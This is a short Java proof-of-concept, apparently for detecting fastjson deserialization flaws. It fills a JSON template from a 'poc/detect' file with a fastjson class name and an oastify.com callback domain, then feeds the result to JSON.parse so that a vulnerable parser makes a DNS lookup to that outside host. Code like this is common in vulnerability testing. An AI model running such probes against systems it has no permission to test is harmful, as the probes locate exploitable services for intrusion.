package vul;

import com.alibaba.fastjson.JSON;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

public class dns {
    public static void main(String[] args) throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/detect/dnslog.json")), StandardCharsets.UTF_8);
        String clazz = "com.alibaba.fastjson.parser.ParserConfig";
        String url = ".rd84e975j9m5a5c7oraoz0chl8rzfq3f.oastify.com";

        String replace = json.replace("${clazz}", clazz).replace("${url}", url);
        System.out.println(replace);

        JSON.parse(replace);
    }
}
